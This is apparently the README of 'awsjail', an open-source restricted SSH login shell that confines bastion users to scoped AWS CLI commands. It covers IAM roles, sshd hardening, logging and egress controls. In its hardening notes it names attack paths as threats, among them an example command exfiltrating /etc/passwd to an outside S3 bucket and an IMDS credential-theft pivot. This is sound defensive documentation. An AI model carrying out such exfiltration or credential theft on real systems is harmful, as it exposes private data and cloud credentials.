# awsjail

An aws-only login shell for SSH bastions. Scoped AWS CLI per user, no keys in any user's hands, no internet access from the terminal, every command logged.

A login shell that only runs the AWS CLI. Users SSH in with a key, land at an `awsjail:<account-id>:<user> > ` prompt, and can run `aws ...` commands and nothing else. The box assumes the user's IAM role for them, so no AWS keys ever touch a human. Every command is logged.

## Contents

- [Why this exists](#why-this-exists)
- [Use cases](#use-cases)
- [How it works](#how-it-works)
- [Credential model](#credential-model)
- [Build](#build)
- [IAM](#iam)
- [Host setup](#host-setup)
- [Admin/Bastion Manager Setup](#adminbastion-manager-setup)
- [sshd](#sshd)
- [Logging](#logging)
- [Network (no internet from the terminal)](#network-no-internet-from-the-terminal)
- [v2 hardening](#v2-hardening)
- [Traps this design already handles](#traps-this-design-already-handles)
- [Reporting security issues](#reporting-security-issues)
- [References](#references)
- [License](#license)

## Why this exists

Every common way to hand out AWS CLI access has a catch.

Access keys end up in a dotfile, a git repo, a Slack DM. Once a key is on a laptop, you've lost track of where it goes.

CloudShell runs outside your account with open internet from the terminal. You can't stop egress there, and the environment isn't yours to log.

A full-shell bastion lets people roam the box and pivot to other hosts, and command logging dies the moment someone spawns a subshell.

awsjail gives each user exactly the `aws` access their tier allows, on a host with no egress, and logs every command where they can't get around it.

## Use cases

**Operators and on-call.** Give the platform team scoped `aws` against prod without handing out keys. Each person gets a tier and an SSH key.

**Contractors and vendors.** Someone needs `s3` and `logs` for two weeks. Add them to `roles.json` with a locked-down tier, drop their SSH key on the box, and pull it when they're done. CloudTrail shows exactly what they ran under `RoleSessionName`.

**Regulated environments.** When you need a command-level record of who ran what against AWS, awsjail is the choke point and CloudTrail is the corroborating record.

**Egress-controlled access.** You specifically don't want the terminal that runs `aws` to reach the internet. awsjail assumes egress is sealed at the network and makes sure the shell itself can't be turned into a way out.

**Training and labs.** Students run `aws` against a scoped account but can't wander the host or reach the internet.

## How it works

![awsjail architecture](docs/architecture.png)

1. A user connects with their SSH key. sshd starts `awsjail` as their login shell.
2. `awsjail` reads the unix user and looks up that user's tier role in `/etc/awsjail/roles.json`.
3. It calls `aws sts assume-role` for that role with `RoleSessionName=<user>`, using the instance profile, and gets short-lived credentials.
4. Interactive, you land at `awsjail:<account-id>:<user> > `. Each line is split into argv and checked: only `aws` runs (`help` is an alias for `aws help`), everything else is `command not found`. `aws` is exec'd directly with no shell, so `;`, `|`, `$()`, and backticks are literal arguments.
5. Non-interactive `ssh host "aws ..."` arrives as `-c` or `SSH_ORIGINAL_COMMAND` and goes through the same check, so there's no one-shot bypass.
6. The `aws` process runs in a clean environment (pager off, config and credentials files at `/dev/null`, only the assumed credentials). Every command and its exit code go to syslog with the user and source IP.

```
$ ssh dbbackup@bastion -i key
aws-only shell. only 'aws ...' is permitted. 'help' = aws help. type 'exit' to quit.
awsjail:123456789012:dbbackup > id
id: command not found (only 'aws' is permitted)
awsjail:123456789012:dbbackup > aws sts get-caller-identity
{
    "UserId": "AROA...:dbbackup",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/tier-dbbackup/dbbackup"
}
```

## Credential model

- The box has one instance role, `awsjail-bastion-instance-role`, whose only power is `sts:AssumeRole` into the tier roles.
- One IAM role per permission tier (admin, s3-operator, dbbackup, ...). Each tier role's trust policy trusts only the bastion instance role.
- On login, `awsjail` assumes the user's mapped role with `RoleSessionName=<unix user>` and exports the temporary credentials into a clean env for the CLI. Nothing is stored, nothing is printed.
- Humans hold only an SSH key. Retire the existing per-user access keys after cutover.
- `RoleSessionName` = the unix user, so CloudTrail shows exactly who ran what.

## Build

Stdlib only, no external modules. Build static so `LD_PRELOAD` can't touch it.

```
CGO_ENABLED=0 go build -o awsjail .
install -m 0755 awsjail /usr/local/bin/awsjail
```

The box needs the aws CLI at `/usr/local/bin/aws`. Region is per-user, set in `roles.json` (see [Host setup](#host-setup)), not a build-time const.

## IAM

Tier role trust policy (repeat per tier role, e.g. `tier-dbbackup`):

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::123456789012:role/awsjail-bastion-instance-role" },
    "Action": "sts:AssumeRole"
  }]
}
```

Bastion instance role policy (least privilege: assume the tier roles, ship logs):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "sts:AssumeRole",
      "Resource": [
        "arn:aws:iam::123456789012:role/tier-admin",
        "arn:aws:iam::123456789012:role/tier-s3-operator",
        "arn:aws:iam::123456789012:role/tier-dbbackup"
      ]
    },
    {
      "Effect": "Allow",
      "Action": ["logs:CreateLogStream", "logs:PutLogEvents"],
      "Resource": "arn:aws:logs:ap-south-1:123456789012:log-group:/awsjail/*"
    }
  ]
}
```

## Host setup

```
groupadd awsjail
useradd -m -G awsjail -s /usr/local/bin/awsjail dbbackup   # new user
usermod -s /usr/local/bin/awsjail -aG awsjail existinguser # existing user
echo /usr/local/bin/awsjail >> /etc/shells

install -d -m 0700 -o root -g root /var/lib/awsjail         # session HOME, root-owned
install -d -m 0755 /etc/awsjail

# unix user -> tier role ARN + region (like a profile in ~/.aws/config)
tee /etc/awsjail/roles.json >/dev/null <<'JSON'
{
  "dbbackup": {"role_arn": "arn:aws:iam::123456789012:role/tier-dbbackup",     "region": "ap-south-1"},
  "s3ops":    {"role_arn": "arn:aws:iam::123456789012:role/tier-s3-operator", "region": "ap-south-1"},
  "admin1":   {"role_arn": "arn:aws:iam::123456789012:role/tier-admin",       "region": "us-east-1"}
}
JSON
chmod 0644 /etc/awsjail/roles.json
```

Put each user's SSH public key in their `~/.ssh/authorized_keys` as usual.

## Admin/Bastion Manager Setup

The steps in [Host setup](#host-setup) above are what happens under the hood. In practice, do this instead.

### Prerequisites

- Ubuntu 22.04 or 24.04 LTS.
- Root access.
- A copy of this repo on the box (`git clone`, `scp`, or however you already move files there).

### Quick start

```
sudo ./setup.sh
```

You'll be prompted to paste a public key for the break-glass admin account.
Pass `--bastion-admin-pubkey-file /path/to/key.pub` instead if you're running
this non-interactively, and `--skip-sshd-reload` if you want to review
`/etc/ssh/sshd_config.d/00-awsjail.conf` before it takes effect.

### What `setup.sh` does

- Installs Go (official tarball) and the AWS CLI v2 (official installer) if
  they're missing or the wrong version — never via `apt`, so the version is
  pinned and predictable.
- Creates the `awsjail` group, `/etc/awsjail`, `/var/lib/awsjail`, and an
  empty `/etc/awsjail/roles.json` if one doesn't already exist. Never
  overwrites an existing `roles.json`.
- Registers `/usr/local/bin/awsjail` in `/etc/shells`.
- Builds and installs both binaries: `awsjail` to `/usr/local/bin/awsjail`
  (0755), `awsjail-admin` to `/usr/local/sbin/awsjail-admin` (0700,
  root-only).
- Creates the break-glass account `bastion-admin` and installs the pubkey
  you provide.
- Writes the sshd hardening as a drop-in at
  `/etc/ssh/sshd_config.d/00-awsjail.conf`, comments out the sftp subsystem,
  runs `sshd -t`, and reloads sshd only if that passes.

Every step checks current state first, so re-running `setup.sh` on an
already-provisioned host is safe.

### The break-glass account

`bastion-admin` is a normal, sudo-capable SSH account, deliberately outside
the `awsjail` group — if `awsjail` itself is ever broken, this is how you
get onto the box to fix it. It gets full, unrestricted SSH (no forwarding
lockdown), because it's the account that does real troubleshooting.

**Never add `bastion-admin` to the `awsjail` group** — that would put it
under the `Match Group awsjail` restriction and defeat its purpose.

Its `authorized_keys` accepts multiple keys (append, not overwrite) if more
than one admin needs break-glass access over the life of the host. To add
another admin's key later:

```
echo "ssh-ed25519 AAAA... newadmin@laptop" >> /home/bastion-admin/.ssh/authorized_keys
```

### Managing tier users with `awsjail-admin`

`awsjail-admin` is root-only (0700, `/usr/local/sbin`) and replaces the
manual `useradd`/`roles.json`/`authorized_keys` steps in
[Host setup](#host-setup) with validated, atomic, audited operations. Run
it via `sudo` so its audit log records who ran it.

| Command | Flags | Does |
| --- | --- | --- |
| `add-user` | `--username`, `--role-arn`, `--region`, `--pubkey-file` | Creates the unix account if needed (or heals its shell/group if it drifted), upserts its `roles.json` entry, installs the key. Re-run with a new `--pubkey-file` to rotate a key. |
| `remove-user` | `--username` | Removes the `roles.json` entry and clears `authorized_keys`. Does not delete the unix account or home directory. |
| `list-users` | none | Lists every mapped user with role ARN, region, key fingerprint, and a status flag for drift (`no-key`, `key-parse-error`). |

Onboard a new tier user:

```
sudo awsjail-admin add-user \
  --username dbbackup \
  --role-arn arn:aws:iam::123456789012:role/tier-dbbackup \
  --region ap-south-1 \
  --pubkey-file dbbackup.pub
```

Rotate their key:

```
sudo awsjail-admin add-user \
  --username dbbackup \
  --role-arn arn:aws:iam::123456789012:role/tier-dbbackup \
  --region ap-south-1 \
  --pubkey-file dbbackup-new.pub
```

Offboard them:

```
sudo awsjail-admin remove-user --username dbbackup
```

Check the current state of every tier user:

```
sudo awsjail-admin list-users
```

### Where things live

| Path | Owner:mode | What |
| --- | --- | --- |
| `/usr/local/bin/awsjail` | root:root, 0755 | The jail binary. |
| `/usr/local/sbin/awsjail-admin` | root:root, 0700 | The admin binary. Root-only by path convention and file mode. |
| `/etc/awsjail/roles.json` | root:root, 0644 | Username -> `{role_arn, region}` map. Managed by `awsjail-admin`; manual edits bypass the audit trail. |
| `/var/lib/awsjail` | root:root, 0700 | Session `HOME` for the jail. |
| `/etc/ssh/sshd_config.d/00-awsjail.conf` | root:root | sshd hardening drop-in, regenerated by `setup.sh`. |
| `/home/bastion-admin` | bastion-admin:bastion-admin | Break-glass account home. |

### Audit trail

Every `add-user` and `remove-user` writes one JSON line to syslog facility
`authpriv`, tag `awsjail-admin`: `{"actor", "action", "target", "result"}`,
where `actor` is whoever ran `sudo`. This sits alongside the three logging
layers in [Logging](#logging) — it's the record of who provisioned or
deprovisioned access, not of what a session did with that access.

## sshd

This is a dedicated bastion, so kill sftp box-wide and disable all forwarding. sftp uses the ssh subsystem, not the login shell, so leaving it on is a full bypass of the jail.

`/etc/ssh/sshd_config`:

```
PubkeyAuthentication yes
PasswordAuthentication no
PermitRootLogin no
PermitUserEnvironment no

# Remove/comment the sftp subsystem on this host:
#Subsystem sftp /usr/lib/openssh/sftp-server

Match Group awsjail
    PermitTTY yes
    X11Forwarding no
    AllowTcpForwarding no
    AllowAgentForwarding no
    AllowStreamLocalForwarding no
    PermitTunnel no
    PermitOpen none
```

`sshd -t && systemctl reload ssh`. Confirm there's no `AcceptEnv *` anywhere; the default accepts no client env, which is what you want (it stops a client setting `LD_PRELOAD`, `AWS_PROFILE`, `AWS_PAGER`, etc).

## Logging

Three layers:

- **awsjail -> syslog (authpriv).** Each command is logged as JSON:
  `{"user","src","cmd","exit","action"}`. Ship the auth log to CloudWatch with
  the agent, into a log group the bastion users have no write access to.
- **CloudTrail.** The authoritative API record. Per-user via `RoleSessionName`.
- **auditd backstop.** Catches the aws exec even if awsjail's logger is somehow
  bypassed. On a single-purpose bastion, log every exec by human users:

```
-a always,exit -F arch=b64 -S execve -F auid>=1000 -F auid!=unset -k awsjail_exec
```

## Network (no internet from the terminal)

- Private subnet. No IGW route, no NAT.
- Security group egress denies `0.0.0.0/0`; allow only the VPC endpoint ENIs.
- VPC interface endpoints for `sts`, `logs`, and every service the tiers use.
  S3 via a gateway endpoint. This keeps all AWS API traffic on the backbone.
- Endpoint policies: restrict the STS endpoint to your tier roles; pin the S3
  endpoint to the buckets/accounts you allow.

Even if a user reads their session creds out of the env, no egress means they
can't be used off the box, and the creds are only the user's own scoped role.

## v2 hardening

1. **IMDS pivot.** The jail's AssumeRole call talks to IMDS as the logged-in
   user's own uid, and IMDS has no per-uid authorization — if the jail's argv
   check were ever bypassed, that uid could query IMDS directly and walk off
   with the *instance role's* credentials, which can assume any tier role.
   Until then, rely on the trust policies: a user's assumed session can't
   assume a sibling tier, because the tier roles trust only the bastion
   instance role, not each other.

   A group-based `iptables` block looks like the obvious network-layer fix
   but does not survive contact with this design — attempted and reverted:
   - `iptables -m owner --gid-owner` matches only the process's *effective*
     gid. With `awsjail` as a supplementary group the rule matches nothing
     (verified live: zero packets while a tier user read IMDS freely).
   - Make `awsjail` the users' *primary* group and the rule bites — but it
     also bites the jail itself, whose own AssumeRole needs IMDS.
   - Exempt the jail with a setgid binary (egid `awsjail-broker`) and the
     network part works — but `rgid != egid` puts glibc in `AT_SECURE`
     mode, which strips `LD_LIBRARY_PATH`, and the AWS CLI v2 (a PyInstaller
     binary) then dies with `ImportError: libsqlite3.so`. The jail can't
     fix this: an unprivileged process can't raise its real gid.

   The clean fix is a small root broker: move AssumeRole into a daemon that
   listens on a unix socket, maps `SO_PEERCRED` uid -> role, and is the only
   thing on the box that talks to IMDS. Then every awsjail-group process can
   be firewalled off 169.254.169.254 with no setgid games.
2. **Exfil through AWS.** "No internet" does not stop `aws s3 cp /etc/passwd
   s3://theirbucket` if the role allows it. Scope every tier role to its
   resources, deny cross-account, and pin buckets/accounts in the VPC endpoint
   policies. This is an IAM problem, not a shell or network one.
3. **Session TTL.** Creds are 1h (`sessionTTL`). For longer sessions raise
   `--duration-seconds` up to the role's max session duration, or add
   re-assume-on-expiry to the REPL loop.

## Traps this design already handles

- Direct argv exec, no shell, so `;` `|` `&` `$()` and backticks are inert.
  JMESPath `--query` with `|` and backticks still works because those go to aws
  as literal argv (tested).
- Non-interactive `ssh host "cmd"` and `SSH_ORIGINAL_COMMAND` are validated the
  same as an interactive line, so there's no `-c` bypass.
- Pager disabled (`AWS_PAGER=`), so `less` and `aws help` can't spawn a shell.
- Fresh env every session, no inherited `LD_PRELOAD` / `AWS_PROFILE`.
  `AWS_CONFIG_FILE` and `AWS_SHARED_CREDENTIALS_FILE` are `/dev/null` and HOME
  is a root-owned empty dir, so a planted `~/.aws/config` can't run
  `credential_process` or load another profile.

## Reporting security issues

Open a PR via GitHub please! Contributions and enhancements welcome!

## References

- OpenSSH `sshd_config`, `ForceCommand` and the `restrict` key option: https://man.openbsd.org/sshd_config
- EC2 instance metadata (IMDS): https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- AWS PrivateLink and VPC endpoints: https://docs.aws.amazon.com/vpc/latest/privatelink/
- STS AssumeRole and RoleSessionName: https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
- AWS CLI User Guide (pager, config, and alias behavior): https://docs.aws.amazon.com/cli/latest/userguide/
- CloudTrail: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/

## License

MIT. See [LICENSE](LICENSE).

---

Built by Riyaz Walikar. Build, Break, Repeat.

[ibreak.software](https://ibreak.software)

Happy hacking.
